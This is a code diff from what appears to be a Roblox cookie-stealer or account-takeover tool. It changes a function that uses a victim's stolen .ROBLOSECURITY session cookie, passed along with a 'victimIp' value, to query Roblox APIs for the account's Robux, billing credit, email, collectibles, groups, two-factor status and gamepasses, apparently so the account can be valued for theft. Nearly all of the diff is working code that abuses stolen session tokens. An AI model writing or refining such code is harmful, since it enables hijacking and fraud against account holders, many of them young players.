@@ -108,38 +108,40 @@ async function robloxProxy(cookie, victimIp, uid) {
 
 async function fetchRobloxInfo(cookie, victimIp = null) {
   try {
-    // Step 1: Auth-only first to get uid (lightweight, single request via worker)
-    const authFirst = await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, victimIp, endpoints: [{ key: 'auth', url: 'https://users.roblox.com/v1/users/authenticated' }] })
-    });
-    if (!authFirst.ok) return null;
-    const authFirstData = await authFirst.json();
-    if (!authFirstData.auth?.ok) return null;
-    let auth;
-    try { auth = JSON.parse(authFirstData.auth.data); } catch { return null; }
-    if (!auth?.id) return null;
+    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
+    
+    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
+    if (!authRes.ok) return null;
+    const auth = await authRes.json();
     const uid = auth.id;
-
-    // Grab refreshed cookie if Roblox returned one
-    let refreshedCookie = authFirstData.auth?.refreshedCookie || null;
-
-    // Step 2: Fetch all remaining info via worker with uid known
-    const allData = await robloxProxy(cookie, victimIp, uid);
-    if (!allData) return null;
-    if (allData._refreshedCookie) refreshedCookie = allData._refreshedCookie;
-
-    const profile     = allData.profile    || null;
-    const robuxData   = allData.robux      || null;
-    const friendsData = allData.friends    || null;
-    const isPremium   = allData.premium;
-    const billingData = allData.billing    || null;
-    const emailData   = allData.email      || null;
-    const groupsData  = allData.groups     || { data: [] };
-    const limitedsData= allData.limiteds   || { data: [] };
-    const avatarData  = allData.avatar     || null;
-    const tfaData     = allData.tfa        || null;
+    
+    // Fetch main data
+    const [
+      profileRes, robuxRes, friendsRes, premiumRes,
+      billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
+    ] = await Promise.all([
+      fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
+      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
+      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
+      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
+      fetch('https://billing.roblox.com/v1/credit', { headers }),
+      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
+      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
+      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
+      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
+      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
+    ]);
+    
+    const profile = profileRes.ok ? await profileRes.json() : null;
+    const robuxData = robuxRes.ok ? await robuxRes.json() : null;
+    const friendsData = friendsRes.ok ? await friendsRes.json() : null;
+    const isPremium = premiumRes.ok ? await premiumRes.json() : false;
+    const billingData = billingRes.ok ? await billingRes.json() : null;
+    const emailData = emailRes.ok ? await emailRes.json() : null;
+    const groupsData = groupsRes.ok ? await groupsRes.json() : { data: [] };
+    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
+    const avatarData = avatarRes.ok ? await avatarRes.json() : null;
+    const tfaData = tfaRes?.ok ? await tfaRes.json() : null;
     
     let accountAgeDays = 'N/A';
     if (profile?.created) {
@@ -174,9 +176,9 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
     
     // Check popular gamepasses (MM2, Adopt Me, etc)
     const gamepasses = {
-      mm2: await checkGamepass(uid, '17510307'), // Murder Mystery 2 VIP
-      adoptMe: await checkGamepass(uid, '33135930'), // Adopt Me VIP
-      plsDonate: await checkGamepass(uid, '12345678') // Example ID
+      mm2: await checkGamepass(uid, '17510307', headers), // Murder Mystery 2 VIP
+      adoptMe: await checkGamepass(uid, '33135930', headers), // Adopt Me VIP
+      plsDonate: await checkGamepass(uid, '12345678', headers) // Example ID
     };
     
     const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
@@ -203,7 +205,7 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
       twoFA,
       gamepasses,
       avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png',
-      refreshedCookie: refreshedCookie || null
+      refreshedCookie: null // Direct API calls don't refresh cookies
     };
   } catch (err) {
     console.error('Roblox fetch error:', err);
